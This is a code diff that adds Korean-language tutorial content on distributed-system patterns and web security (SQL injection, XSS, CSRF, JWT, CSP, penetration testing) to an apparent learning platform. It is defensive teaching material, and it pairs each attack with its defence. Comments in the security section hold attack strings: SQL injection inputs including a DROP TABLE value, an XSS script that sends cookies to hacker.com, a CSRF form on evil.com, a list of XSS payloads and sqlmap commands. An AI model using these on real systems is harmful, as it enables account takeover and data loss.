+                  heading: "2. Redlock (Redis 분산 잠금 알고리즘)",
+                  content: "여러 Redis 인스턴스에서 안전하게 잠금을 관리:",
+                  code: `const Redlock = require('redlock');
+const Redis = require('ioredis');
+
+// 최소 3개의 Redis 인스턴스 (홀수 권장)
+const redisA = new Redis({ host: 'redis1.example.com' });
+const redisB = new Redis({ host: 'redis2.example.com' });
+const redisC = new Redis({ host: 'redis3.example.com' });
+
+const redlock = new Redlock(
+  [redisA, redisB, redisC],
+  {
+    driftFactor: 0.01,
+    retryCount: 10,
+    retryDelay: 200,
+    retryJitter: 200
+  }
+);
+
+// 잠금 획득
+app.post('/api/limited-offer', async (req, res) => {
+  const resource = 'limited-offer:item123';
+  const ttl = 5000; // 5초
+
+  let lock;
+  try {
+    // 과반수(2/3) Redis에서 잠금 획득 성공해야 함
+    lock = await redlock.acquire([resource], ttl);
+
+    // 비즈니스 로직 실행
+    const stock = await db.query('SELECT stock FROM products WHERE id = 123');
+
+    if (stock[0].stock > 0) {
+      await db.query('UPDATE products SET stock = stock - 1 WHERE id = 123');
+      res.json({ success: true });
+    } else {
+      res.status(410).json({ error: '품절' });
+    }
+
+  } catch (error) {
+    res.status(409).json({ error: '잠시 후 다시 시도해주세요' });
+
+  } finally {
+    if (lock) {
+      await lock.release();
+    }
+  }
+});`
+                },
+                {
+                  heading: "3. 이벤트 소싱 (Event Sourcing) 패턴",
+                  content: "상태를 직접 저장하지 않고 이벤트 시퀀스로 저장하여 동시성 문제 해결:",
+                  code: `// 기존 방식 (상태 저장)
+UPDATE accounts SET balance = balance - 100 WHERE id = 123;
+// 문제: 동시 출금 시 Race Condition 발생
+
+// 이벤트 소싱 (이벤트 저장)
+// events 테이블
+// id | aggregate_id | event_type | amount | timestamp | version
+// 1  | acc-123      | Deposited  | 1000   | ...       | 1
+// 2  | acc-123      | Withdrawn  | 100    | ...       | 2
+// 3  | acc-123      | Withdrawn  | 50     | ...       | 3
+
+class BankAccount {
+  constructor(accountId) {
+    this.accountId = accountId;
+    this.balance = 0;
+    this.version = 0;
+  }
+
+  // 이벤트 적용
+  apply(event) {
+    switch (event.type) {
+      case 'Deposited':
+        this.balance += event.amount;
+        break;
+      case 'Withdrawn':
+        this.balance -= event.amount;
+        break;
+    }
+    this.version = event.version;
+  }
+
+  // 상태 복원
+  static async load(accountId) {
+    const account = new BankAccount(accountId);
+
+    const events = await db.query(
+      'SELECT * FROM events WHERE aggregate_id = ? ORDER BY version',
+      [accountId]
+    );
+
+    events.forEach(event => account.apply(event));
+    return account;
+  }
+
+  // 출금 커맨드
+  async withdraw(amount) {
+    if (this.balance < amount) {
+      throw new Error('잔액 부족');
+    }
+
+    const event = {
+      aggregate_id: this.accountId,
+      type: 'Withdrawn',
+      amount: amount,
+      version: this.version + 1
+    };
+
+    // Optimistic Concurrency Control
+    const result = await db.query(\`
+      INSERT INTO events (aggregate_id, event_type, amount, version)
+      SELECT ?, ?, ?, ?
+      WHERE NOT EXISTS (
+        SELECT 1 FROM events
+        WHERE aggregate_id = ? AND version >= ?
+      )
+    \`, [
+      this.accountId, event.type, event.amount, event.version,
+      this.accountId, event.version
+    ]);
+
+    if (result.affectedRows === 0) {
+      throw new Error('다른 사용자가 먼저 처리했습니다. 다시 시도해주세요.');
+    }
+
+    this.apply(event);
+  }
+}
+
+// 사용
+const account = await BankAccount.load('acc-123');
+await account.withdraw(100);`
+                },
+                {
+                  heading: "4. CQRS (Command Query Responsibility Segregation)",
+                  content: "읽기와 쓰기를 분리하여 성능과 확장성 향상:",
+                  code: `// Write Model (명령 처리)
+class OrderCommandHandler {
+  async createOrder(command) {
+    // 1. 이벤트 생성
+    const event = {
+      type: 'OrderCreated',
+      orderId: uuid(),
+      userId: command.userId,
+      items: command.items,
+      timestamp: new Date()
+    };
+
+    // 2. 이벤트 스토어에 저장
+    await eventStore.append('orders', event);
+
+    // 3. 이벤트 발행 (Message Queue)
+    await eventBus.publish('order.created', event);
+  }
+}
+
+// Read Model (조회 최적화)
+// 이벤트를 구독하여 읽기 전용 DB 업데이트
+eventBus.subscribe('order.created', async (event) => {
+  // MongoDB에 비정규화된 데이터 저장
+  await readDB.collection('orders').insertOne({
+    orderId: event.orderId,
+    userId: event.userId,
+    items: event.items,
+    userName: await getUserName(event.userId), // Join 미리 수행
+    totalAmount: calculateTotal(event.items),
+    createdAt: event.timestamp
+  });
+
+  // Elasticsearch에 검색용 인덱스 생성
+  await searchIndex.index({
+    index: 'orders',
+    id: event.orderId,
+    body: {
+      orderId: event.orderId,
+      items: event.items.map(i => i.name).join(' '),
+      createdAt: event.timestamp
+    }
+  });
+});
+
+// 조회 API (읽기 전용 DB 사용)
+app.get('/api/orders/:userId', async (req, res) => {
+  const orders = await readDB.collection('orders').find({
+    userId: req.params.userId
+  }).toArray();
+
+  res.json(orders); // 빠른 조회, JOIN 불필요
+});`
+                },
+                {
+                  heading: "5. CRDTs (Conflict-free Replicated Data Types)",
+                  content: "분산 시스템에서 자동으로 충돌 해결하는 자료구조:",
+                  code: `// 예시: 협업 문서 편집 (Google Docs 같은)
+// G-Counter (증가만 가능한 카운터)
+class GCounter {
+  constructor(nodeId) {
+    this.nodeId = nodeId;
+    this.counts = {}; // { node1: 5, node2: 3 }
+  }
+
+  increment() {
+    this.counts[this.nodeId] = (this.counts[this.nodeId] || 0) + 1;
+  }
+
+  value() {
+    return Object.values(this.counts).reduce((a, b) => a + b, 0);
+  }
+
+  merge(other) {
+    for (const [node, count] of Object.entries(other.counts)) {
+      this.counts[node] = Math.max(
+        this.counts[node] || 0,
+        count
+      );
+    }
+  }
+}
+
+// 사용 (좋아요 카운터)
+const counter1 = new GCounter('server1');
+const counter2 = new GCounter('server2');
+
+counter1.increment(); // server1에서 +1
+counter2.increment(); // server2에서 +1
+counter2.increment(); // server2에서 +1
+
+console.log(counter1.value()); // 1
+console.log(counter2.value()); // 2
+
+// 동기화 (네트워크 복구 후)
+counter1.merge(counter2);
+console.log(counter1.value()); // 3 (자동 병합!)
+
+// LWW-Element-Set (Last-Write-Wins Set)
+// 실시간 협업 태그 편집에 사용
+class LWWSet {
+  constructor() {
+    this.adds = {}; // { 'tag1': timestamp }
+    this.removes = {}; // { 'tag1': timestamp }
+  }
+
+  add(element) {
+    this.adds[element] = Date.now();
+  }
+
+  remove(element) {
+    this.removes[element] = Date.now();
+  }
+
+  has(element) {
+    const addTime = this.adds[element] || 0;
+    const removeTime = this.removes[element] || 0;
+    return addTime > removeTime; // 더 최근 타임스탬프 우선
+  }
+
+  merge(other) {
+    for (const [elem, time] of Object.entries(other.adds)) {
+      this.adds[elem] = Math.max(this.adds[elem] || 0, time);
+    }
+    for (const [elem, time] of Object.entries(other.removes)) {
+      this.removes[elem] = Math.max(this.removes[elem] || 0, time);
+    }
+  }
+}`
+                },
+                {
+                  heading: "6. 실전: 분산 속도 제한 (Rate Limiting)",
+                  code: `// Redis를 이용한 분산 Rate Limiter
+const rateLimit = require('express-rate-limit');
+const RedisStore = require('rate-limit-redis');
+
+const limiter = rateLimit({
+  store: new RedisStore({
+    client: redis,
+    prefix: 'rl:'
+  }),
+  windowMs: 60 * 1000, // 1분
+  max: 100, // 100 요청
+  message: '너무 많은 요청입니다. 1분 후 다시 시도해주세요.',
+  standardHeaders: true,
+  legacyHeaders: false
+});
+
+app.use('/api/', limiter);
+
+// Sliding Window Log 알고리즘 (더 정확한 제한)
+async function checkRateLimit(userId, limit = 100, window = 60) {
+  const key = \`rate:\${userId}\`;
+  const now = Date.now();
+  const windowStart = now - (window * 1000);
+
+  // 1. 오래된 기록 삭제
+  await redis.zremrangebyscore(key, 0, windowStart);
+
+  // 2. 현재 윈도우 내 요청 수 확인
+  const count = await redis.zcard(key);
+
+  if (count >= limit) {
+    return false; // 제한 초과
+  }
+
+  // 3. 현재 요청 기록
+  await redis.zadd(key, now, \`\${now}:\${Math.random()}\`);
+  await redis.expire(key, window);
+
+  return true; // 허용
+}
+
+app.post('/api/action', async (req, res) => {
+  const allowed = await checkRateLimit(req.user.id, 10, 60);
+
+  if (!allowed) {
+    return res.status(429).json({
+      error: '1분에 10번까지만 가능합니다.'
+    });
+  }
+
+  // 비즈니스 로직
+});`
+                },
+                {
+                  heading: "⚡ 고급 실습 과제",
+                  checklist: [
+                    "Redlock으로 다중 Redis 분산 잠금 구현 후 한 Redis 다운시켜도 정상 동작 확인",
+                    "이벤트 소싱 패턴으로 은행 계좌 시스템 구현 (입금/출금 이벤트)",
+                    "CQRS 패턴으로 주문 시스템 구현 (쓰기용 MySQL, 읽기용 MongoDB)",
+                    "G-Counter로 분산 좋아요 카운터 구현 후 여러 서버 동기화",
+                    "Sliding Window Log 알고리즘으로 API Rate Limiter 구현 (분당 100회)"
+                  ]
+                }
+              ]
+            }
+          }
         },
         {
           id: '3-3',
@@ -2719,7 +4103,871 @@ groups:
             'SQL Injection 공격 시뮬레이션',
             '현재 사용 중인 인증 방식 파악',
             'SSL 인증서 만료일 확인'
-          ]
+          ],
+          content: {
+            beginner: {
+              title: "초급: 주요 웹 보안 위협 이해하고 기본 방어하기",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "OWASP Top 10 중 핵심 공격을 이해하고, 기본적인 방어 코드를 작성할 수 있다."
+                },
+                {
+                  heading: "1. SQL Injection (가장 위험한 공격)",
+                  content: "악의적인 SQL 코드를 주입하여 데이터베이스를 조작하는 공격입니다.",
+                  code: `// 취약한 코드 (절대 이렇게 하지 마세요!)
+app.post('/login', (req, res) => {
+  const query = \`
+    SELECT * FROM users
+    WHERE username = '\${req.body.username}'
+    AND password = '\${req.body.password}'
+  \`;
+
+  db.query(query, (err, users) => {
+    if (users.length > 0) {
+      res.json({ success: true });
+    }
+  });
+});
+
+// 공격 시나리오:
+// username: admin' --
+// password: (아무거나)
+
+// 실제 실행되는 쿼리:
+// SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
+// '--'는 주석이므로 비밀번호 검증이 무시됨!
+
+// 더 위험한 공격:
+// username: admin'; DROP TABLE users; --
+// 실행: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
+// 결과: users 테이블 삭제!`
+                },
+                {
+                  heading: "2. SQL Injection 방어 - Prepared Statement 사용",
+                  code: `// 안전한 코드 (Parameterized Query)
+app.post('/login', async (req, res) => {
+  const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
+
+  const [users] = await db.query(query, [
+    req.body.username,
+    req.body.password
+  ]);
+
+  if (users.length > 0) {
+    res.json({ success: true });
+  } else {
+    res.status(401).json({ error: '로그인 실패' });
+  }
+});
+
+// 작동 원리:
+// 1. ?는 플레이스홀더
+// 2. 두 번째 인자의 값이 자동으로 이스케이프됨
+// 3. username에 "admin' --"를 넣어도 문자열로 처리
+// 4. SELECT * FROM users WHERE username = 'admin\\' --' ... (안전!)
+
+// ORM 사용 시 (더 안전)
+const user = await User.findOne({
+  where: {
+    username: req.body.username,
+    password: req.body.password
+  }
+});`
+                },
+                {
+                  heading: "3. XSS (Cross-Site Scripting) 공격",
+                  content: "악의적인 JavaScript를 삽입하여 다른 사용자의 브라우저에서 실행시키는 공격입니다.",
+                  code: `// 취약한 코드
+app.get('/profile/:userId', async (req, res) => {
+  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.userId]);
+
+  res.send(\`
+    <h1>프로필</h1>
+    <p>이름: \${user.name}</p>
+    <p>소개: \${user.bio}</p>
+  \`);
+});
+
+// 공격 시나리오:
+// 사용자가 bio에 입력:
+// <script>fetch('https://hacker.com/steal?cookie='+document.cookie)</script>
+
+// 다른 사용자가 프로필 방문 시:
+// 1. 스크립트가 실행됨
+// 2. 세션 쿠키가 해커 서버로 전송됨
+// 3. 해커가 쿠키로 로그인 가능 (계정 탈취!)`
+                },
+                {
+                  heading: "4. XSS 방어 - HTML 이스케이핑",
+                  code: `// 안전한 코드 (HTML Escaping)
+const escapeHtml = (text) => {
+  return text
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#039;');
+};
+
+app.get('/profile/:userId', async (req, res) => {
+  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.userId]);
+
+  res.send(\`
+    <h1>프로필</h1>
+    <p>이름: \${escapeHtml(user.name)}</p>
+    <p>소개: \${escapeHtml(user.bio)}</p>
+  \`);
+});
+
+// 결과:
+// <script>alert(1)</script>
+// → &lt;script&gt;alert(1)&lt;/script&gt; (화면에 그대로 표시)
+
+// React는 자동으로 이스케이프:
+function Profile({ user }) {
+  return (
+    <div>
+      <h1>프로필</h1>
+      <p>이름: {user.name}</p>
+      <p>소개: {user.bio}</p>
+    </div>
+  );
+}
+// React는 {}안의 값을 자동으로 이스케이프 (안전!)`
+                },
+                {
+                  heading: "5. HTTPS와 SSL/TLS 인증서",
+                  steps: [
+                    {
+                      label: "인증서 만료일 확인",
+                      code: `# 방법 1: OpenSSL 명령어
+openssl s_client -connect yourdomain.com:443 -servername yourdomain.com 2>/dev/null | openssl x509 -noout -dates
+
+# 출력:
+# notBefore=Jan  1 00:00:00 2024 GMT
+# notAfter=Apr  1 23:59:59 2024 GMT  ← 만료일!
+
+# 방법 2: 브라우저
+# 1. 사이트 접속
+# 2. 주소창 자물쇠 아이콘 클릭
+# 3. "인증서" 클릭
+# 4. "유효 기간" 확인`
+                    },
+                    {
+                      label: "Let's Encrypt로 무료 인증서 발급",
+                      code: `# Certbot 설치 (Ubuntu)
+sudo apt install certbot python3-certbot-nginx
+
+# 인증서 발급 및 Nginx 자동 설정
+sudo certbot --nginx -d yourdomain.com -d www.yourdomain.com
+
+# 자동 갱신 설정 (90일마다 필요)
+sudo certbot renew --dry-run
+
+# Cron으로 자동화
+sudo crontab -e
+# 매일 새벽 3시에 갱신 체크
+0 3 * * * certbot renew --quiet`
+                    }
+                  ]
+                },
+                {
+                  heading: "6. 안전한 비밀번호 저장 (해싱)",
+                  code: `// 절대 안 됨: 평문 저장
+await db.query('INSERT INTO users (username, password) VALUES (?, ?)', [
+  username,
+  password // 그대로 저장 ← 위험!
+]);
+
+// 안전: bcrypt로 해싱
+const bcrypt = require('bcrypt');
+
+// 회원가입
+app.post('/signup', async (req, res) => {
+  const saltRounds = 10;
+  const hashedPassword = await bcrypt.hash(req.body.password, saltRounds);
+
+  await db.query('INSERT INTO users (username, password) VALUES (?, ?)', [
+    req.body.username,
+    hashedPassword // 해시된 값 저장
+  ]);
+
+  res.json({ success: true });
+});
+
+// 로그인
+app.post('/login', async (req, res) => {
+  const [users] = await db.query('SELECT * FROM users WHERE username = ?', [
+    req.body.username
+  ]);
+
+  if (users.length === 0) {
+    return res.status(401).json({ error: '사용자 없음' });
+  }
+
+  const match = await bcrypt.compare(req.body.password, users[0].password);
+
+  if (match) {
+    res.json({ success: true });
+  } else {
+    res.status(401).json({ error: '비밀번호 틀림' });
+  }
+});
+
+// DB에 저장되는 예시:
+// username: admin
+// password: $2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
+// → 원본 비밀번호 복구 불가능!`
+                },
+                {
+                  heading: "💡 초급 실습 과제",
+                  checklist: [
+                    "취약한 로그인 코드에 SQL Injection 공격 시도 후 성공 확인",
+                    "Prepared Statement로 수정 후 공격 방어 확인",
+                    "사용자 입력을 그대로 출력하여 XSS 공격 재현",
+                    "HTML 이스케이핑 적용 후 스크립트 실행 안 되는지 확인",
+                    "현재 운영 중인 사이트의 SSL 인증서 만료일 확인"
+                  ]
+                }
+              ]
+            },
+            intermediate: {
+              title: "중급: 인증/인가 시스템과 CSRF 방어",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "JWT 인증을 구현하고, CSRF와 같은 세션 관련 공격을 방어할 수 있다."
+                },
+                {
+                  heading: "1. JWT (JSON Web Token) 인증 구현",
+                  code: `const jwt = require('jsonwebtoken');
+const SECRET_KEY = process.env.JWT_SECRET; // 환경변수로 관리
+
+// 로그인 (토큰 발급)
+app.post('/login', async (req, res) => {
+  const [users] = await db.query('SELECT * FROM users WHERE username = ?', [
+    req.body.username
+  ]);
+
+  if (users.length === 0) {
+    return res.status(401).json({ error: '인증 실패' });
+  }
+
+  const match = await bcrypt.compare(req.body.password, users[0].password);
+
+  if (!match) {
+    return res.status(401).json({ error: '인증 실패' });
+  }
+
+  // JWT 토큰 생성
+  const token = jwt.sign(
+    {
+      userId: users[0].id,
+      username: users[0].username,
+      role: users[0].role
+    },
+    SECRET_KEY,
+    { expiresIn: '1h' } // 1시간 후 만료
+  );
+
+  res.json({ token });
+});
+
+// 인증 미들웨어
+function authenticateToken(req, res, next) {
+  const authHeader = req.headers['authorization'];
+  const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN
+
+  if (!token) {
+    return res.status(401).json({ error: '토큰 없음' });
+  }
+
+  jwt.verify(token, SECRET_KEY, (err, user) => {
+    if (err) {
+      return res.status(403).json({ error: '유효하지 않은 토큰' });
+    }
+
+    req.user = user; // 토큰에서 추출한 정보
+    next();
+  });
+}
+
+// 보호된 라우트
+app.get('/api/profile', authenticateToken, async (req, res) => {
+  const [users] = await db.query('SELECT * FROM users WHERE id = ?', [
+    req.user.userId
+  ]);
+
+  res.json(users[0]);
+});
+
+// Frontend에서 사용
+fetch('/api/profile', {
+  headers: {
+    'Authorization': \`Bearer \${token}\`
+  }
+})`
+                },
+                {
+                  heading: "2. Refresh Token으로 보안 강화",
+                  code: `// Access Token (짧은 만료 시간) + Refresh Token (긴 만료 시간)
+app.post('/login', async (req, res) => {
+  // ... 인증 로직
+
+  const accessToken = jwt.sign(
+    { userId: user.id },
+    ACCESS_TOKEN_SECRET,
+    { expiresIn: '15m' } // 15분
+  );
+
+  const refreshToken = jwt.sign(
+    { userId: user.id },
+    REFRESH_TOKEN_SECRET,
+    { expiresIn: '7d' } // 7일
+  );
+
+  // Refresh Token을 DB에 저장
+  await db.query('UPDATE users SET refresh_token = ? WHERE id = ?', [
+    refreshToken,
+    user.id
+  ]);
+
+  res.json({ accessToken, refreshToken });
+});
+
+// Access Token 갱신 엔드포인트
+app.post('/refresh', async (req, res) => {
+  const { refreshToken } = req.body;
+
+  if (!refreshToken) {
+    return res.status(401).json({ error: '리프레시 토큰 없음' });
+  }
+
+  // DB에 저장된 토큰과 일치하는지 확인
+  const [users] = await db.query('SELECT * FROM users WHERE refresh_token = ?', [
+    refreshToken
+  ]);
+
+  if (users.length === 0) {
+    return res.status(403).json({ error: '유효하지 않은 토큰' });
+  }
+
+  jwt.verify(refreshToken, REFRESH_TOKEN_SECRET, (err, user) => {
+    if (err) {
+      return res.status(403).json({ error: '만료된 토큰' });
+    }
+
+    const newAccessToken = jwt.sign(
+      { userId: user.userId },
+      ACCESS_TOKEN_SECRET,
+      { expiresIn: '15m' }
+    );
+
+    res.json({ accessToken: newAccessToken });
+  });
+});
+
+// 로그아웃 (토큰 무효화)
+app.post('/logout', authenticateToken, async (req, res) => {
+  await db.query('UPDATE users SET refresh_token = NULL WHERE id = ?', [
+    req.user.userId
+  ]);
+
+  res.json({ success: true });
+});`
+                },
+                {
+                  heading: "3. CSRF (Cross-Site Request Forgery) 공격과 방어",
+                  content: "사용자가 로그인한 상태에서 악의적인 요청을 자동으로 보내는 공격입니다.",
+                  code: `// 공격 시나리오:
+// 1. 사용자가 example.com에 로그인 (쿠키 저장됨)
+// 2. 악의적인 사이트 evil.com 방문
+// 3. evil.com에 숨겨진 코드:
+<form action="https://example.com/transfer" method="POST">
+  <input type="hidden" name="to" value="hacker">
+  <input type="hidden" name="amount" value="10000">
+</form>
+<script>document.forms[0].submit();</script>
+
+// 결과:
+// - 사용자 모르게 10000원이 해커에게 송금됨
+// - 브라우저가 자동으로 쿠키를 포함하여 요청을 보냄
+
+// 방어 1: CSRF 토큰 사용
+const csurf = require('csurf');
+const csrfProtection = csurf({ cookie: true });
+
+app.get('/form', csrfProtection, (req, res) => {
+  res.render('form', { csrfToken: req.csrfToken() });
+});
+
+app.post('/transfer', csrfProtection, (req, res) => {
+  // CSRF 토큰이 유효하지 않으면 자동으로 403 에러
+  // 유효한 경우에만 여기 도달
+  res.json({ success: true });
+});
+
+// HTML:
+<form action="/transfer" method="POST">
+  <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+  <input name="to">
+  <input name="amount">
+  <button type="submit">송금</button>
+</form>
+
+// 방어 2: SameSite 쿠키 속성
+res.cookie('sessionId', sessionId, {
+  httpOnly: true,
+  secure: true,
+  sameSite: 'strict' // 다른 사이트에서의 요청에는 쿠키 안 보냄
+});`
+                },
+                {
+                  heading: "4. 권한 관리 (Authorization)",
+                  code: `// Role-Based Access Control (RBAC)
+const roles = {
+  admin: ['read', 'write', 'delete', 'manage_users'],
+  editor: ['read', 'write'],
+  viewer: ['read']
+};
+
+function authorize(requiredPermission) {
+  return (req, res, next) => {
+    const userRole = req.user.role; // JWT에서 추출
+    const permissions = roles[userRole];
+
+    if (!permissions || !permissions.includes(requiredPermission)) {
+      return res.status(403).json({
+        error: '권한이 없습니다.'
+      });
+    }
+
+    next();
+  };
+}
+
+// 사용
+app.delete('/api/posts/:id',
+  authenticateToken,
+  authorize('delete'), // delete 권한 필요
+  async (req, res) => {
+    await db.query('DELETE FROM posts WHERE id = ?', [req.params.id]);
+    res.json({ success: true });
+  }
+);
+
+// 더 세밀한 제어: 본인 것만 수정 가능
+app.put('/api/posts/:id',
+  authenticateToken,
+  async (req, res) => {
+    const [posts] = await db.query('SELECT * FROM posts WHERE id = ?', [
+      req.params.id
+    ]);
+
+    if (posts.length === 0) {
+      return res.status(404).json({ error: '게시글 없음' });
+    }
+
+    // 본인 글이거나 관리자인 경우에만 허용
+    if (posts[0].author_id !== req.user.userId && req.user.role !== 'admin') {
+      return res.status(403).json({ error: '권한 없음' });
+    }
+
+    await db.query('UPDATE posts SET content = ? WHERE id = ?', [
+      req.body.content,
+      req.params.id
+    ]);
+
+    res.json({ success: true });
+  }
+);`
+                },
+                {
+                  heading: "5. Rate Limiting으로 브루트포스 방어",
+                  code: `const rateLimit = require('express-rate-limit');
+
+// 로그인 시도 제한
+const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000, // 15분
+  max: 5, // 5번 시도
+  message: '너무 많은 로그인 시도. 15분 후 다시 시도하세요.',
+  skipSuccessfulRequests: true // 성공하면 카운트 안 함
+});
+
+app.post('/login', loginLimiter, async (req, res) => {
+  // 로그인 로직
+});
+
+// IP별 제한 + 사용자별 제한
+const RedisStore = require('rate-limit-redis');
+
+const apiLimiter = rateLimit({
+  store: new RedisStore({ client: redis }),
+  windowMs: 60 * 1000,
+  max: async (req) => {
+    if (req.user && req.user.role === 'admin') {
+      return 1000; // 관리자는 1000회
+    }
+    return 100; // 일반 사용자는 100회
+  },
+  keyGenerator: (req) => {
+    // 로그인 사용자는 userId, 비로그인은 IP
+    return req.user ? \`user:\${req.user.userId}\` : \`ip:\${req.ip}\`;
+  }
+});
+
+app.use('/api/', apiLimiter);`
+                },
+                {
+                  heading: "⚡ 중급 실습 과제",
+                  checklist: [
+                    "JWT 인증 시스템 구현 후 Postman으로 토큰 확인",
+                    "만료된 토큰으로 요청 시 403 에러 발생하는지 테스트",
+                    "CSRF 토큰 없이 요청 시 차단되는지 확인",
+                    "일반 사용자로 관리자 전용 API 호출 시 403 확인",
+                    "로그인 5번 실패 후 15분 제한되는지 확인"
+                  ]
+                }
+              ]
+            },
+            advanced: {
+              title: "고급: 보안 모니터링과 침투 테스트",
+              sections: [
+                {
+                  heading: "📚 학습 목표",
+                  content: "보안 취약점을 자동으로 탐지하고, 침투 테스트로 시스템을 강화할 수 있다."
+                },
+                {
+                  heading: "1. OWASP ZAP로 자동 취약점 스캔",
+                  steps: [
+                    {
+                      label: "설치 및 기본 스캔",
+                      code: `# Docker로 OWASP ZAP 실행
+docker run -t owasp/zap2docker-stable zap-baseline.py -t https://your-app.com
+
+# 결과:
+# WARN-NEW: SQL Injection (GET parameter 'id')
+# WARN-NEW: Cross Site Scripting (Reflected) (POST parameter 'comment')
+# WARN-NEW: Missing Anti-CSRF Tokens (POST /api/transfer)
+
+# HTML 리포트 생성
+docker run -v $(pwd):/zap/wrk/:rw -t owasp/zap2docker-stable \\
+  zap-full-scan.py -t https://your-app.com -r report.html`
+                    },
+                    {
+                      label: "CI/CD 파이프라인 통합",
+                      code: `# .github/workflows/security-scan.yml
+name: Security Scan
+on:
+  pull_request:
+    branches: [main]
+
+jobs:
+  zap_scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Run ZAP Scan
+        run: |
+          docker run -v \${GITHUB_WORKSPACE}:/zap/wrk/:rw \\
+            -t owasp/zap2docker-stable \\
+            zap-baseline.py -t \${{ secrets.STAGING_URL }} \\
+            -r zap-report.html
+
+      - name: Upload Report
+        uses: actions/upload-artifact@v3
+        with:
+          name: zap-report
+          path: zap-report.html
+
+      # 심각한 취약점 발견 시 PR 차단
+      - name: Check Vulnerabilities
+        run: |
+          if grep -q "FAIL-NEW" zap-report.html; then
+            echo "Critical vulnerabilities found!"
+            exit 1
+          fi`
+                    }
+                  ]
+                },
+                {
+                  heading: "2. Content Security Policy (CSP) 설정",
+                  code: `// XSS 공격을 원천 차단하는 HTTP 헤더
+const helmet = require('helmet');
+
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: ["'self'"],
+    scriptSrc: [
+      "'self'",
+      "'unsafe-inline'", // React의 인라인 스크립트 허용 (최소화 권장)
+      "https://cdn.jsdelivr.net"
+    ],
+    styleSrc: ["'self'", "'unsafe-inline'"],
+    imgSrc: ["'self'", "data:", "https:"],
+    connectSrc: ["'self'", "https://api.example.com"],
+    fontSrc: ["'self'", "https://fonts.gstatic.com"],
+    objectSrc: ["'none'"],
+    upgradeInsecureRequests: []
+  }
+}));
+
+// 응답 헤더:
+// Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; ...
+
+// 효과:
+// 1. 허용되지 않은 도메인의 스크립트 실행 차단
+// 2. 인라인 스크립트 차단 (XSS 방어)
+// 3. eval() 같은 위험한 함수 차단
+
+// 위반 리포트 수집
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    // ... 위와 동일
+    reportUri: '/api/csp-report'
+  }
+}));
+
+app.post('/api/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
+  console.log('CSP Violation:', req.body);
+  // Sentry 등으로 전송
+  res.status(204).end();
+});`
+                },
+                {
+                  heading: "3. 보안 로그 수집 및 분석",
+                  code: `// Winston으로 보안 이벤트 로깅
+const winston = require('winston');
+
+const securityLogger = winston.createLogger({
+  level: 'info',
+  format: winston.format.json(),
+  transports: [
+    new winston.transports.File({ filename: 'security.log' }),
+    new winston.transports.Console()
+  ]
+});
+
+// 의심스러운 활동 로깅
+app.post('/login', async (req, res) => {
+  const { username, password } = req.body;
+
+  const [users] = await db.query('SELECT * FROM users WHERE username = ?', [username]);
+
+  if (users.length === 0) {
+    securityLogger.warn('Login attempt with non-existent user', {
+      username,
+      ip: req.ip,
+      userAgent: req.headers['user-agent'],
+      timestamp: new Date()
+    });
+    return res.status(401).json({ error: '인증 실패' });
+  }
+
+  const match = await bcrypt.compare(password, users[0].password);
+
+  if (!match) {
+    securityLogger.warn('Failed login attempt', {
+      userId: users[0].id,
+      username,
+      ip: req.ip,
+      timestamp: new Date()
+    });
+
+    // 5번 실패 시 계정 잠금
+    await db.query(
+      'UPDATE users SET failed_attempts = failed_attempts + 1 WHERE id = ?',
+      [users[0].id]
+    );
+
+    const updatedUser = await db.query('SELECT * FROM users WHERE id = ?', [users[0].id]);
+    if (updatedUser[0].failed_attempts >= 5) {
+      securityLogger.error('Account locked due to multiple failed attempts', {
+        userId: users[0].id,
+        ip: req.ip
+      });
+      await db.query('UPDATE users SET locked_until = ? WHERE id = ?', [
+        new Date(Date.now() + 30 * 60 * 1000), // 30분 잠금
+        users[0].id
+      ]);
+    }
+
+    return res.status(401).json({ error: '인증 실패' });
+  }
+
+  // 성공 시 실패 카운터 리셋
+  await db.query('UPDATE users SET failed_attempts = 0 WHERE id = ?', [users[0].id]);
+
+  securityLogger.info('Successful login', {
+    userId: users[0].id,
+    ip: req.ip
+  });
+
+  // JWT 발급...
+});
+
+// 권한 없는 접근 시도
+app.use((err, req, res, next) => {
+  if (err.status === 403) {
+    securityLogger.warn('Unauthorized access attempt', {
+      userId: req.user?.userId,
+      path: req.path,
+      method: req.method,
+      ip: req.ip
+    });
+  }
+  next(err);
+});`
+                },
+                {
+                  heading: "4. 침투 테스트 (Penetration Testing)",
+                  code: `# sqlmap으로 SQL Injection 테스트
+sqlmap -u "https://your-app.com/api/users?id=1" --batch --risk=3 --level=5
+
+# 결과:
+# [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+# [INFO] GET parameter 'id' is vulnerable. Do you want to keep testing? [y/N] y
+# sqlmap identified the following injection point(s):
+# Parameter: id (GET)
+#   Type: boolean-based blind
+#   Payload: id=1 AND 1=1
+
+# Burp Suite로 XSS 테스트
+# 1. Burp Suite 실행
+# 2. 브라우저 프록시 설정
+# 3. Intruder 탭에서 페이로드 설정:
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+
+# 4. Attack 실행 후 응답 확인
+
+# Nikto 웹 서버 스캔
+nikto -h https://your-app.com
+
+# 결과:
+# + Server: nginx/1.18.0
+# + The anti-clickjacking X-Frame-Options header is not present.
+# + The X-Content-Type-Options header is not set.
+# + No CGI Directories found
+# + OSVDB-3268: /backup/: Directory indexing found.
+
